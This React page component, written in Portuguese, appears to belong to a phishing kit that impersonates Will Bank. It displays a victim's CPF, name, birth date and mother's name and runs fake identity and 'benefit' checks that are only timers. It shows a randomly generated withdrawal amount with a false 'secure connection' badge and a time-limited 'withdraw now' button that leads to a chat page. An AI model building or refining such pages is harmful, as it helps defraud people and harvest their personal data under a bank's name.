import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { 
  CheckCircle, 
  CreditCard, 
  User, 
  Calendar, 
  Users, 
  Shield,
  Loader2,
  ChevronRight,
  BadgeCheck,
  Wallet
} from "lucide-react";
import { Button } from "@/components/ui/button";
import willbankLogo from "@/assets/willbank-logo.png";
import { CPFData } from "@/lib/cpf";

type VerificationStep = "searching" | "validating" | "calculating" | "ready";

interface StepStatus {
  searching: boolean;
  validating: boolean;
  calculating: boolean;
}

const Consulta = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [currentStep, setCurrentStep] = useState<VerificationStep>("searching");
  const [stepStatus, setStepStatus] = useState<StepStatus>({
    searching: false,
    validating: false,
    calculating: false,
  });
  const [dataRevealStep, setDataRevealStep] = useState(0);
  const [showValue, setShowValue] = useState(false);

  const cpfData: CPFData | undefined = location.state?.cpfData;

  // Gera valor aleatório entre R$ 1.500 e R$ 8.500
  const [valorBeneficio] = useState(() => {
    return Math.floor(Math.random() * (8500 - 1500 + 1) + 1500);
  });

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }

    // Sequência de verificação
    const sequence = async () => {
      // Step 1: Searching
      await delay(2000);
      setStepStatus(prev => ({ ...prev, searching: true }));
      setCurrentStep("validating");

      // Step 2: Validating
      await delay(2000);
      setStepStatus(prev => ({ ...prev, validating: true }));
      setCurrentStep("calculating");

      // Step 3: Calculating
      await delay(2000);
      setStepStatus(prev => ({ ...prev, calculating: true }));
      setCurrentStep("ready");

      // Reveal data step by step
      await delay(500);
      for (let i = 1; i <= 4; i++) {
        await delay(600);
        setDataRevealStep(i);
      }

      // Show value
      await delay(800);
      setShowValue(true);
    };

    sequence();
  }, [cpfData, navigate]);

  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  const handleEfetuarSaque = () => {
    navigate("/chat", { state: { cpfData, valorBeneficio } });
  };

  if (!cpfData) return null;

  const dataFields = [
    { icon: CreditCard, label: "CPF", value: cpfData.cpf },
    { icon: User, label: "Nome", value: cpfData.nome },
    { icon: Calendar, label: "Nascimento", value: cpfData.dataNascimento },
    cpfData.nomeMae ? { icon: Users, label: "Nome da Mãe", value: cpfData.nomeMae } : null,
  ].filter(Boolean) as { icon: any; label: string; value: string }[];

  const getStepIcon = (completed: boolean, isCurrent: boolean) => {
    if (completed) return <CheckCircle className="w-5 h-5 text-emerald-400" />;
    if (isCurrent) return <Loader2 className="w-5 h-5 text-primary animate-spin" />;
    return <div className="w-5 h-5 rounded-full border-2 border-slate-600" />;
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-900 via-slate-800 to-slate-900 flex flex-col">
      {/* Header */}
      <header className="px-4 py-4 flex items-center justify-between">
        <img src={willbankLogo} alt="Will Bank" className="h-8 object-contain" />
        <div className="flex items-center gap-2 text-emerald-400 text-xs">
          <Shield className="w-4 h-4" />
          <span>Conexão segura</span>
        </div>
      </header>

      {/* Breadcrumb */}
      <div className="px-4 py-2 border-b border-slate-700/50">
        <div className="flex items-center gap-2 text-xs text-slate-400">
          <span>Início</span>
          <ChevronRight className="w-3 h-3" />
          <span>Biometria</span>
          <ChevronRight className="w-3 h-3" />
          <span className="text-white font-medium">Consulta</span>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-4 py-6">
        <div className="w-full max-w-md space-y-6">

          {/* Title */}
          <div className="text-center space-y-2">
            <h1 className="text-2xl font-bold text-white">
              Analisando seus dados
            </h1>
            <p className="text-slate-400 text-sm">
              Aguarde enquanto verificamos seu benefício
            </p>
          </div>

          {/* Verification Steps */}
          <div className="bg-slate-800/50 rounded-xl p-4 space-y-4 border border-slate-700/50">
            <div className="flex items-center gap-3">
              {getStepIcon(stepStatus.searching, currentStep === "searching")}
              <div className="flex-1">
                <p className={`font-medium ${stepStatus.searching ? "text-emerald-400" : "text-white"}`}>
                  Buscando cadastro
                </p>
                <p className="text-xs text-slate-500">Verificando base de dados</p>
              </div>
            </div>

            <div className="flex items-center gap-3">
              {getStepIcon(stepStatus.validating, currentStep === "validating")}
              <div className="flex-1">
                <p className={`font-medium ${stepStatus.validating ? "text-emerald-400" : currentStep === "validating" || stepStatus.searching ? "text-white" : "text-slate-500"}`}>
                  Validando identidade
                </p>
                <p className="text-xs text-slate-500">Confirmando dados biométricos</p>
              </div>
            </div>

            <div className="flex items-center gap-3">
              {getStepIcon(stepStatus.calculating, currentStep === "calculating")}
              <div className="flex-1">
                <p className={`font-medium ${stepStatus.calculating ? "text-emerald-400" : currentStep === "calculating" ? "text-white" : "text-slate-500"}`}>
                  Calculando benefício
                </p>
                <p className="text-xs text-slate-500">Verificando valores disponíveis</p>
              </div>
            </div>
          </div>

          {/* User Data */}
          <div className="space-y-3">
            {dataFields.map((field, index) => {
              const Icon = field.icon;
              const isRevealed = dataRevealStep > index;
              
              return (
                <div
                  key={field.label}
                  className={`flex items-center gap-3 p-4 bg-slate-800/30 rounded-xl border transition-all duration-300 ${
                    isRevealed ? "border-emerald-500/30" : "border-slate-700/50"
                  }`}
                >
                  <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                    isRevealed ? "bg-emerald-500/20" : "bg-slate-700/50"
                  }`}>
                    <Icon className={`w-5 h-5 ${isRevealed ? "text-emerald-400" : "text-slate-500"}`} />
                  </div>
                  <div className="flex-1">
                    <p className="text-xs text-slate-500">{field.label}</p>
                    {isRevealed ? (
                      <p className="font-medium text-white animate-fade-in">
                        {field.value}
                      </p>
                    ) : (
                      <div className="h-5 bg-slate-700/50 rounded w-32 animate-pulse" />
                    )}
                  </div>
                  {isRevealed && <CheckCircle className="w-5 h-5 text-emerald-400" />}
                </div>
              );
            })}
          </div>

          {/* Benefit Value */}
          {showValue && (
            <div className="animate-scale-in space-y-4">
              <div className="bg-gradient-to-r from-emerald-500/20 to-emerald-600/10 rounded-2xl p-6 border border-emerald-500/30 text-center">
                <div className="flex items-center justify-center gap-2 mb-3">
                  <BadgeCheck className="w-6 h-6 text-emerald-400" />
                  <span className="text-emerald-400 font-medium">Benefício Localizado!</span>
                </div>
                <p className="text-slate-400 text-sm mb-2">
                  Valor disponível para saque:
                </p>
                <p className="text-4xl font-bold text-white">
                  R$ {valorBeneficio.toLocaleString('pt-BR')},00
                </p>
              </div>

              <Button
                onClick={handleEfetuarSaque}
                className="w-full h-14 text-lg font-semibold bg-primary hover:bg-primary/90 text-primary-foreground"
              >
                <Wallet className="w-5 h-5 mr-2" />
                Iniciar saque agora
                <ChevronRight className="w-5 h-5 ml-2" />
              </Button>

              <p className="text-center text-xs text-slate-500">
                ⏱️ Saque disponível por tempo limitado
              </p>
            </div>
          )}

        </div>
      </main>

      {/* Footer */}
      <footer className="px-4 py-4 border-t border-slate-800">
        <div className="text-center">
          <img src={willbankLogo} alt="Will Bank" className="h-5 mx-auto object-contain opacity-50" />
        </div>
      </footer>
    </div>
  );
};

export default Consulta;
